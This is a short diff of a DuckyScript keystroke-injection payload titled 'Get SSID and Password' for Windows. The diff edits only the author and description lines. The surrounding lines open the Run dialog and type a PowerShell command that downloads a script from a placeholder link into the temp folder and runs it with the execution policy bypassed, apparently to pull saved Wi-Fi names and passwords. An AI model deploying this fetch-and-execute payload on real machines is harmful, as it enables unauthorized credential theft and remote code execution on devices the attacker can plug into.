@@ -1,6 +1,6 @@
 REM Title: Get SSID and Password
-REM Author: @DjCode
-REM Description: Uses Powershell to get SSID and Password
+REM Author: @DjCode2
+REM Description: Uses Powershell to get SSID and Password, on the screen
 REM Target: Windows (PowerShell >= 3.0, so W11/10/8, and maybe 7)
 
 GUI r
@@ -10,4 +10,5 @@ DELAY 500
 ALTSTRING powershell   iwr <You link> -OutFile $env:TEMP\ssid.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\ssid.ps1
 
 ENTER
+
 
